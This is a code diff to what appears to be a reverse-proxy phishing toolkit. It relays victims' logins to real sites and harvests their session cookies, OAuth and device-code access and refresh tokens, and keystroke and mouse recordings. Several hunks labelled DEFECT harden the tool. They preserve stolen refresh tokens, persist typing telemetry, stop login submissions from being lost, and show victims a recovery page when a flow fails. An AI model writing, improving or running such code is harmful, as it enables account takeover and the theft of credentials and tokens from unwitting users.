@@ -91,6 +91,10 @@ MAX_INTEL_SCORES = 2000        # one entry per sid; a client can invent sids
 # The session map holds one small object per victim. Cap it and evict the
 # least-recently-seen entries, otherwise a long campaign grows forever.
 MAX_SESSIONS = 5000
+# The typing/mouse telemetry the hook ships is kept in memory for the session's own
+# report; this bounds the durable copy that rides in the vault record so a long visit
+# cannot grow the stored record without limit.
+RECORDING_PERSIST = 500
 # short alias so a page can also post to /intel
 INTEL_ALIAS_FALLBACK = "/intel"
 
@@ -715,7 +719,15 @@ class ProxyEngine:
                 wanted, _opt = self.phishlet.token_wanted(n, "")
             if wanted:
                 sess.tokens[n] = True
-        sess.vault["tokens"] = dict(sess.tokens)
+        # merge, never replace: an OAuth/device-code token set (real access/refresh
+        # values, mirrored into rec["tokens"] by session.add_oauth) lives here too, and a
+        # later cookie/header harvest used to overwrite it with a bare {name: True} dict,
+        # wiping the refresh token the token tier and the CLI read.
+        bucket = sess.vault.setdefault("tokens", {})
+        if not isinstance(bucket, dict):
+            bucket = {}
+            sess.vault["tokens"] = bucket
+        bucket.update(sess.tokens)
 
     def maybe_complete(self, sess, path="", host=None):
         """Flip the session to 'captured' the moment the phishlet's tokens are in.
@@ -806,6 +818,11 @@ class ProxyEngine:
             sess.recording.extend(events[:500])
             if len(sess.recording) > 5000:
                 del sess.recording[:-5000]
+            # DEFECT: the recording was collected and capped but only len() was ever
+            # consumed - the telemetry never left the process and was lost on restart.
+            # Persist a bounded tail into the vault so it survives (and rides along in
+            # the stored record).
+            sess.vault["recording"] = sess.recording[-RECORDING_PERSIST:]
         for name, value in (cookies or {}).items():
             if not self.phishlet.wants_cookie(name):
                 continue
@@ -1011,7 +1028,8 @@ class ProxyEngine:
         callback = self.path_of(getattr(self.phishlet, "oauth_callback", "/__bh/oauth/cb"))
         redirect_uri = spec.redirect_uri or f"{self.public_base()}{callback}"
         flow = self.oauth_manager.start(spec, sess.sid, redirect_uri=redirect_uri)
-        sess.vault.setdefault("meta", {})["oauth_state"] = flow.state
+        # (the flow's state is tracked by OauthManager.by_state; storing it on the vault
+        # was dead state - nothing ever read or compared it)
         self.log(f"[proxy] oauth {spec.provider}: consent flow started for {sess.sid[:8]}")
         return flow.authorize_url()
 
@@ -1772,14 +1790,29 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
         (http.client reads the first value), frame one request two ways: a client can
         smuggle a second request inside the first body's bytes and the server answers
         twice on one connection.
+
+        Every refusal here leaves a body (or a would-be body) unread on a keep-alive
+        connection, so the connection is closed: otherwise the leftover bytes were parsed
+        as the next request line and the client got an answer to a request it never sent
+        (measured: `username=v&password=pGET /x` read back as a method name).
         """
         te = self.headers.get("Transfer-Encoding")
         cls = self.headers.get_all("Content-Length") or []
         if te and cls:
+            self.close_connection = True
             self._json({"ok": False, "error": "ambiguous framing"}, status=400)
             return False
         if len(cls) > 1:
+            self.close_connection = True
             self._json({"ok": False, "error": "duplicate content-length"}, status=400)
+            return False
+        if te and te.strip().lower() != "chunked":
+            # DEFECT: a transfer coding we cannot decode (e.g. `gzip`, or `gzip, chunked`)
+            # was accepted, the body was silently dropped and the login POST was relayed
+            # empty - the credentials were lost and the upstream session never established.
+            # RFC 9112 7.1: a server MUST respond 501 to an unsupported transfer coding.
+            self.close_connection = True
+            self._json({"ok": False, "error": "unsupported transfer-encoding"}, status=501)
             return False
         return True
 
@@ -1797,13 +1830,20 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
         try:
             n = int(raw)
         except (TypeError, ValueError):
+            self.close_connection = True
             self._json({"ok": False, "error": "bad content-length"}, status=400)
             return None
         if n < 0:
-            # read(-1) reads to EOF and holds the thread until the client closes
-            return 0
+            # DEFECT: a negative length was silently read as "no body", so the bytes the
+            # client actually sent stayed in the stream and were parsed as the next
+            # request (a desync) while the submission was dropped. It is invalid framing.
+            self.close_connection = True
+            self._json({"ok": False, "error": "bad content-length"}, status=400)
+            return None
         cap = max_body or MAX_BODY
         if n > cap:
+            # the declared body is unread: close so it is never parsed as a request
+            self.close_connection = True
             self._json({"ok": False, "error": "payload too large"}, status=413)
             return None
         return n
@@ -1888,6 +1928,15 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
             self._oauth_page("Sign-in could not be completed",
                              "Close this window and start again from the link.")
             return
+        if flow is None:
+            # DEFECT: a callback with no live flow - the process restarted between the
+            # start and the redirect, or a scanner probed the callback path - returned
+            # None and the next line raised AttributeError, killing the request thread
+            # with a traceback instead of showing the victim the recovery page.
+            self.engine.log("[proxy] oauth callback with no live flow: refused")
+            self._oauth_page("Sign-in could not be completed",
+                             "Close this window and start again from the link.")
+            return
         tokens = dict(flow.tokens or {})
         scopes = str(tokens.get("scope") or self.engine.oauth_ready().scope or "").split()
         with contextlib.suppress(Exception):
@@ -1895,7 +1944,6 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
                                   client_id=flow.spec.client_id, scopes=scopes,
                                   source="oauth", tenant=flow.spec.tenant,
                                   issuer=flow.spec.issuer)
-            sess.vault.setdefault("meta", {}).pop("oauth_state", None)
             if self.engine.db:
                 self.engine.db.session_save(sess.vault)
         self.engine.log(f"[proxy] oauth {flow.spec.provider}: tokens vaulted for "
@@ -2061,7 +2109,10 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
             try:
                 size = int(size_txt or b"0", 16)
             except ValueError:
-                break
+                # DEFECT: a malformed chunk-size line silently ended the body, leaving the
+                # rest of the chunked stream unread on a keep-alive connection (parsed as
+                # the next request). It is invalid framing - fail it, and the caller closes.
+                raise ValueError("bad chunk size") from None
             if size <= 0:
                 # trailer section: consume until the blank line, then stop
                 while True:
@@ -2091,8 +2142,12 @@ class ProxyHandler(http.server.BaseHTTPRequestHandler):
         if chunked:
             try:
                 body = self._read_chunked() or None
-            except ValueError:
-                self._json({"ok": False, "error": "payload too large"}, status=413)
+            except ValueError as e:
+                # the remaining chunks are unread: close so they are never parsed as a
+                # request line (a rejected chunked body used to desync the connection)
+                self.close_connection = True
+                self._json({"ok": False, "error": str(e)},
+                           status=413 if "too large" in str(e) else 400)
                 return
         else:
             body = self.rfile.read(n) if n else None
